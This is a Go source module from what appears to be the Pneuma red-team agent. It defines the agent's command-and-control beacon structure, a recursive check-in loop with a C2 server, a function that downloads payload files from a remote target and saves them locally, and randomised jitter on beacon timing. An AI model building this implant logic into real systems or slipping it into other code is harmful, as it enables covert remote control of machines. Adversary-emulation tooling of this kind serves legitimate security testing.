package sockets

import (
	"bytes"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	"github.com/preludeorg/pneuma/util"
)

//Contact defines required functions for communicating with the server
type Contact interface {
	Communicate(agent *util.AgentConfig, beacon Beacon) Beacon
}

//CommunicationChannels contains the contact implementations
var CommunicationChannels = map[string]Contact{}

type Beacon struct {
	Name string
	Location string
	Platform string
	Executors []string
	Range string
	Sleep int
	Pwd string
	Links []Instruction
}

type Instruction struct {
	ID string `json:"ID"`
	Executor string `json:"Executor"`
	Payload string `json:"Payload"`
	Request string `json:"Request"`
	Response string
	Status int
	Pid int
}

func EventLoop(agent *util.AgentConfig, beacon Beacon) {
	respBeacon := CommunicationChannels[agent.Contact].Communicate(agent, beacon)
	refreshBeacon(agent, &respBeacon)
	log.Printf("C2 refreshed. [%s] agent at PID %d.", agent.Address, os.Getpid())
	EventLoop(agent, respBeacon)
}

func refreshBeacon(agent *util.AgentConfig, beacon *Beacon) {
	pwd, _ := os.Getwd()
	beacon.Sleep = agent.Sleep
	beacon.Range = agent.Range
	beacon.Pwd = pwd
}

func requestPayload(target string) string {
	var body []byte
	var filename string

	body, filename, _ = requestHTTPPayload(target)
	workingDir := "./"
	path := filepath.Join(workingDir, filename)
	util.SaveFile(bytes.NewReader(body), path)
	return path
}


func jitterSleep(sleep int, beaconType string) {
	rand.Seed(time.Now().UnixNano())
	min := int(float64(sleep) * .90)
	max := int(float64(sleep) * 1.10)
	randomSleep := rand.Intn(max - min + 1) + min
	log.Printf("[%s] Next beacon going out in %d seconds", beaconType, randomSleep)
	time.Sleep(time.Duration(randomSleep) * time.Second)
}
